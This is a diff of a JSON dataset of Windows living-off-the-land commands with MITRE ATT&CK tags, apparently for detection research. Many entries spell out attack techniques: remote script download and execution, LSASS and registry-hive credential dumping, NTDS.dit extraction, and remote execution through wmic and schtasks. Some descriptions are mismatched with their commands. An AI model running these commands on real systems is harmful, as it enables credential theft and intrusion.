@@ -864,7 +1848,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":73,
+        "ID":155,
         "Command":"Presentationhost.exe {PATH_ABSOLUTE:.xbap}",
         "Description":"Executes the target XAML Browser Application (XBAP) file File is used for executing Browser applications",
         "RiskScore":"",
@@ -876,7 +1860,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":74,
+        "ID":156,
+        "Command":"Presentationhost.exe {REMOTEURL}",
+        "Description":"It will download a remote payload and place it in INetCache. File is used for executing Browser applications",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":157,
         "Command":"print \/D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}",
         "Description":"Copy file.exe into the Alternate Data Stream (ADS) of file.txt. Used by Windows to send files to the printer",
         "RiskScore":"",
@@ -888,7 +1884,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":75,
+        "ID":158,
+        "Command":"print \/D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}",
+        "Description":"Copy file from source to destination Used by Windows to send files to the printer",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":159,
+        "Command":"print \/D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}",
+        "Description":"Copy File.exe from a network share to the target c:\\OutFolder\\outfile.exe. Used by Windows to send files to the printer",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":160,
         "Command":"PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}",
         "Description":"Create a ZIP file from a folder in a remote drive Printer Migration Command-Line Tool",
         "RiskScore":"",
@@ -900,7 +1920,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":76,
+        "ID":161,
+        "Command":"PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}",
+        "Description":"Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder Printer Migration Command-Line Tool",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":162,
         "Command":"provlaunch.exe LOLBin",
         "Description":"Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. `reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 \/v altitude \/t REG_DWORD \/d 0` and `reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 \/v Commandline \/d calc.exe`. Registry keys are deleted after successful execution. Launcher process",
         "RiskScore":"",
@@ -912,7 +1944,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":77,
+        "ID":163,
         "Command":"psr.exe \/start \/output {PATH_ABSOLUTE:.zip} \/sc 1 \/gui 0",
         "Description":"Record a user screen without creating a GUI. You should use \"psr.exe \/stop\" to stop recording and create output file. Windows Problem Steps Recorder, used to record screen and clicks.",
         "RiskScore":"",
@@ -924,7 +1956,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":78,
+        "ID":164,
         "Command":"rasautou -d {PATH:.dll} -p export_name -a a -e e",
         "Description":"Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10. Windows Remote Access Dialer",
         "RiskScore":"",
@@ -936,7 +1968,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":79,
+        "ID":165,
         "Command":"rdrleakdiag.exe \/p 940 \/o {PATH_ABSOLUTE:folder} \/fullmemdmp \/wait 1",
         "Description":"Dump process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk). Microsoft Windows resource leak diagnostic tool",
         "RiskScore":"",
@@ -948,7 +1980,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":80,
+        "ID":166,
+        "Command":"rdrleakdiag.exe \/p 832 \/o {PATH_ABSOLUTE:folder} \/fullmemdmp \/wait 1",
+        "Description":"Dump LSASS process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk). Microsoft Windows resource leak diagnostic tool",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1003.001",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":167,
+        "Command":"rdrleakdiag.exe \/p 832 \/o {PATH_ABSOLUTE:folder} \/fullmemdmp \/snap",
+        "Description":"After dumping a process using \/wait 1, subsequent dumps must use \/snap (Creates files called minidump_<PID>.dmp and results_<PID>.hlk). Microsoft Windows resource leak diagnostic tool",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1003.001",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":168,
         "Command":"reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg {PATH_ABSOLUTE}:evilreg.reg",
         "Description":"Export the target Registry key and save it to the specified .REG file within an Alternate data stream. Used to manipulate the registry",
         "RiskScore":"",
@@ -960,7 +2016,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":81,
+        "ID":169,
+        "Command":"reg save HKLM\\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\\SAM {PATH_ABSOLUTE:.3.bak}",
+        "Description":"Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material Used to manipulate the registry",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1003.002",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":170,
         "Command":"regasm.exe {PATH:.dll}",
         "Description":"Loads the target .NET DLL file and executes the RegisterClass function. Part of .NET",
         "RiskScore":"",
@@ -972,7 +2040,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":82,
+        "ID":171,
+        "Command":"regasm.exe \/U {PATH:.dll}",
+        "Description":"Loads the target .DLL file and executes the UnRegisterClass function. Part of .NET",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.009",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":172,
         "Command":"regedit \/E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey",
         "Description":"Export the target Registry key to the specified .REG file. Used by Windows to manipulate registry",
         "RiskScore":"",
@@ -984,7 +2064,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":83,
+        "ID":173,
+        "Command":"regedit {PATH_ABSOLUTE}:regfile.reg",
+        "Description":"Import the target .REG file into the Registry. Used by Windows to manipulate registry",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":174,
         "Command":"regini.exe {PATH}:hidden.ini",
         "Description":"Write registry keys from data inside the Alternate data stream. Used to manipulate the registry",
         "RiskScore":"",
@@ -996,7 +2088,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":84,
+        "ID":175,
         "Command":"Register-cimprovider -path {PATH_ABSOLUTE:.dll}",
         "Description":"Load the target .DLL. Used to register new wmi providers",
         "RiskScore":"",
@@ -1008,7 +2100,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":85,
+        "ID":176,
         "Command":"regsvcs.exe {PATH:.dll}",
         "Description":"Loads the target .NET DLL file and executes the RegisterClass function. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies",
         "RiskScore":"",
@@ -1020,7 +2112,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":86,
+        "ID":177,
+        "Command":"regsvcs.exe {PATH:.dll}",
+        "Description":"Loads the target .NET DLL file and executes the RegisterClass function. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.009",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":178,
         "Command":"regsvr32 \/s \/n \/u \/i:{REMOTEURL:.sct} scrobj.dll",
         "Description":"Execute the specified remote .SCT script with scrobj.dll. Used by Windows to register dlls",
         "RiskScore":"",
@@ -1032,7 +2136,43 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":87,
+        "ID":179,
+        "Command":"regsvr32.exe \/s \/u \/i:{PATH:.sct} scrobj.dll",
+        "Description":"Execute the specified local .SCT script with scrobj.dll. Used by Windows to register dlls",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.010",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":180,
+        "Command":"regsvr32 \/s \/n \/u \/i:{REMOTEURL:.sct} scrobj.dll",
+        "Description":"Execute the specified remote .SCT script with scrobj.dll. Used by Windows to register dlls",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.010",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":181,
+        "Command":"regsvr32.exe \/s \/u \/i:{PATH:.sct} scrobj.dll",
+        "Description":"Execute the specified local .SCT script with scrobj.dll. Used by Windows to register dlls",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.010",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":182,
         "Command":"replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} \/A",
         "Description":"Copy .cab file to destination Used to replace file with another file",
         "RiskScore":"",
@@ -1044,7 +2184,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":88,
+        "ID":183,
+        "Command":"replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} \/A",
+        "Description":"Download\/Copy executable to specified folder Used to replace file with another file",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":184,
         "Command":"rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM",
         "Description":"Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process. Used to verify rpc connection",
         "RiskScore":"",
@@ -1056,7 +2208,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":89,
+        "ID":185,
+        "Command":"rpcping \/s 10.0.0.35 \/e 9997 \/a connect \/u NTLM",
+        "Description":"Trigger an authenticated RPC call to the target server (\/s) that could be relayed to a privileged resource (Sign not Set). Used to verify rpc connection",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1187",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":186,
         "Command":"rundll32.exe {PATH},EntryPoint",
         "Description":"First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute. Used by Windows to execute dll files",
         "RiskScore":"",
@@ -1068,7 +2232,55 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":90,
+        "ID":187,
+        "Command":"rundll32.exe {PATH_SMB:.dll},EntryPoint",
+        "Description":"Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute. Used by Windows to execute dll files",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":188,
+        "Command":"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:{REMOTEURL}\")",
+        "Description":"Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script. Used by Windows to execute dll files",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":189,
+        "Command":"rundll32 \"{PATH}:ADSDLL.dll\",DllMain",
+        "Description":"Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS). Used by Windows to execute dll files",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":190,
+        "Command":"rundll32.exe -sta {CLSID}",
+        "Description":"Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID. Used by Windows to execute dll files",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":191,
         "Command":"runexehelper.exe {PATH_ABSOLUTE:.exe}",
         "Description":"Launches the specified exe. Prerequisites: (1) diagtrack_action_output environment variable must be set to an existing, writable folder; (2) runexewithargs_output.txt file cannot exist in the folder indicated by the variable. Launcher process",
         "RiskScore":"",
@@ -1080,7 +2292,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":91,
+        "ID":192,
         "Command":"Runonce.exe \/AlternateShellStartup",
         "Description":"Executes a Run Once Task that has been configured in the registry. Executes a Run Once Task that has been configured in the registry",
         "RiskScore":"",
@@ -1092,7 +2304,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":92,
+        "ID":193,
         "Command":"runscripthelper.exe surfacecheck \\\\?\\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}",
         "Description":"Execute the PowerShell script with .txt extension Execute target PowerShell script",
         "RiskScore":"",
@@ -1104,7 +2316,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":93,
+        "ID":194,
         "Command":"sc create evilservice binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" \/c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto\\ & sc start evilservice",
         "Description":"Creates a new service and executes the file stored in the ADS. Used by Windows to manage services",
         "RiskScore":"",
@@ -1116,7 +2328,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":94,
+        "ID":195,
+        "Command":"sc config {ExistingServiceName} binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" \/c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}",
+        "Description":"Modifies an existing service and executes the file stored in the ADS. Used by Windows to manage services",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":196,
         "Command":"schtasks \/create \/sc minute \/mo 1 \/tn \"Reverse shell\" \/tr \"{CMD}\"",
         "Description":"Create a recurring task to execute every minute. Schedule periodic tasks",
         "RiskScore":"",
@@ -1128,7 +2352,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":95,
+        "ID":197,
+        "Command":"schtasks \/create \/s targetmachine \/tn \"MyTask\" \/tr \"{CMD}\" \/sc daily",
+        "Description":"Create a scheduled task on a remote computer for persistence\/lateral movement Schedule periodic tasks",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1053.005",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":198,
         "Command":"Scriptrunner.exe -appvscript {PATH:.exe}",
         "Description":"Executes executable Execute binary through proxy binary to evade defensive counter measures",
         "RiskScore":"",
@@ -1140,7 +2376,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":96,
+        "ID":199,
+        "Command":"ScriptRunner.exe -appvscript {PATH_SMB:.cmd}",
+        "Description":"Executes cmd file from remote server Execute binary through proxy binary to evade defensive counter measures",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":200,
         "Command":"setres.exe -w 800 -h 600",
         "Description":"Sets the resolution and then launches 'choice' command from the working directory. Configures display settings",
         "RiskScore":"",
@@ -1152,7 +2400,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":97,
+        "ID":201,
         "Command":"SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}",
         "Description":"Execute file specified in %COMSPEC% Host Process for Setting Synchronization",
         "RiskScore":"",
@@ -1164,7 +2412,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":98,
+        "ID":202,
+        "Command":"SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat}",
+        "Description":"Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat\/reg.exe in that directory thereby causing them to execute instead of the ones in C:\\Windows\\System32. Host Process for Setting Synchronization",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":203,
         "Command":"ssh localhost \"{CMD}\"",
         "Description":"Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines. Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.",
         "RiskScore":"",
@@ -1176,7 +2436,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":99,
+        "ID":204,
+        "Command":"ssh -o ProxyCommand=\"{CMD}\" .",
+        "Description":"Executes specified command from ssh.exe Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":205,
         "Command":"stordiag.exe",
         "Description":"Once executed, Stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it. Storage diagnostic tool",
         "RiskScore":"",
@@ -1188,7 +2460,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":100,
+        "ID":206,
+        "Command":"stordiag.exe",
+        "Description":"Once executed, Stordiag.exe will execute schtasks.exe and powershell.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it. Storage diagnostic tool",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":207,
         "Command":"SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"",
         "Description":"Example command on how inject Powershell code into the process Used by App-v to get App-v server lists",
         "RiskScore":"",
@@ -1200,7 +2484,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":101,
+        "ID":208,
         "Command":"tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}",
         "Description":"Compress one or more files to an alternate data stream (ADS). Used by Windows to extract and create archives.",
         "RiskScore":"",
@@ -1212,7 +2496,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":102,
+        "ID":209,
+        "Command":"tar -xf {PATH}:ads",
+        "Description":"Decompress a compressed file from an alternate data stream (ADS). Used by Windows to extract and create archives.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":210,
+        "Command":"tar -xf {PATH_SMB:.tar}",
+        "Description":"Extracts archive.tar from the remote (internal) host to the current host. Used by Windows to extract and create archives.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":211,
         "Command":"TTDInject.exe \/ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" \/Launch \"{PATH:.exe}\"",
         "Description":"Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated. Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)",
         "RiskScore":"",
@@ -1224,7 +2532,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":103,
+        "ID":212,
+        "Command":"ttdinject.exe \/ClientScenario TTDRecorder \/ddload 0 \/ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" \/launch \"{PATH:.exe}\"",
+        "Description":"Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated. Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":213,
         "Command":"tttracer.exe {PATH_ABSOLUTE:.exe}",
         "Description":"Execute specified executable from tttracer.exe. Requires administrator privileges. Used by Windows 1809 and newer to Debug Time Travel",
         "RiskScore":"",
@@ -1236,7 +2556,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":104,
+        "ID":214,
+        "Command":"TTTracer.exe -dumpFull -attach {PID}",
+        "Description":"Dumps process using tttracer.exe. Requires administrator privileges Used by Windows 1809 and newer to Debug Time Travel",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1003",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":215,
         "Command":"rmdir %temp%\\lolbin \/s \/q 2>nul & mkdir \"%temp%\\lolbin\\Windows Media Player\" & copy C:\\Windows\\System32\\calc.exe \"%temp%\\lolbin\\Windows Media Player\\wmpnscfg.exe\" >nul && cmd \/V \/C \"set \"ProgramW6432=%temp%\\lolbin\" && unregmp2.exe \/HideWMP\"",
         "Description":"Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '\/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\\wmpnscfg.exe'. Microsoft Windows Media Player Setup Utility",
         "RiskScore":"",
@@ -1248,7 +2580,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":105,
+        "ID":216,
         "Command":"vbc.exe \/target:exe {PATH_ABSOLUTE:.vb}",
         "Description":"Binary file used by .NET to compile Visual Basic code to an executable. Binary file used for compile vbs code",
         "RiskScore":"",
@@ -1260,7 +2592,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":106,
+        "ID":217,
+        "Command":"vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb}",
+        "Description":"Binary file used by .NET to compile Visual Basic code to an executable. Binary file used for compile vbs code",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":218,
         "Command":"verclsid.exe \/S \/C {CLSID}",
         "Description":"Used to verify a COM object before it is instantiated by Windows Explorer Used to verify a COM object before it is instantiated by Windows Explorer",
         "RiskScore":"",
@@ -1272,7 +2616,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":107,
+        "ID":219,
         "Command":"wab.exe",
         "Description":"Change HKLM\\Software\\Microsoft\\WAB\\DLLPath and execute DLL of choice Windows address book manager",
         "RiskScore":"",
@@ -1284,7 +2628,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":108,
+        "ID":220,
         "Command":"wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet",
         "Description":"Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx) Windows Backup Administration utility",
         "RiskScore":"",
@@ -1296,7 +2640,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":109,
+        "ID":221,
+        "Command":"wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -notRestoreAcl -quiet",
+        "Description":"Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers. Windows Backup Administration utility",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1003.003",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":222,
         "Command":"winget.exe install --manifest {PATH:.yml}",
         "Description":"Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles` Windows Package Manager tool",
         "RiskScore":"",
@@ -1308,7 +2664,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":110,
+        "ID":223,
+        "Command":"winget.exe install --accept-package-agreements -s msstore {name or ID}",
+        "Description":"Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this. Windows Package Manager tool",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":224,
         "Command":"wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}",
         "Description":"Execute executable with wlrmdr.exe as parent process Windows Logon Reminder executable",
         "RiskScore":"",
@@ -1320,7 +2688,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":111,
+        "ID":225,
         "Command":"wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"",
         "Description":"Execute a .EXE file stored as an Alternate Data Stream (ADS) The WMI command-line (WMIC) utility provides a command-line interface for WMI",
         "RiskScore":"",
@@ -1332,7 +2700,67 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":112,
+        "ID":226,
+        "Command":"wmic.exe process call create \"{CMD}\"",
+        "Description":"Execute calc from wmic The WMI command-line (WMIC) utility provides a command-line interface for WMI",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":227,
+        "Command":"wmic.exe \/node:\"192.168.0.1\" process call create \"{CMD}\"",
+        "Description":"Execute evil.exe on the remote system. The WMI command-line (WMIC) utility provides a command-line interface for WMI",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":228,
+        "Command":"wmic.exe process get brief \/format:\"{REMOTEURL:.xsl}\"",
+        "Description":"Create a volume shadow copy of NTDS.dit that can be copied. The WMI command-line (WMIC) utility provides a command-line interface for WMI",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":229,
+        "Command":"wmic.exe process get brief \/format:\"{PATH_SMB:.xsl}\"",
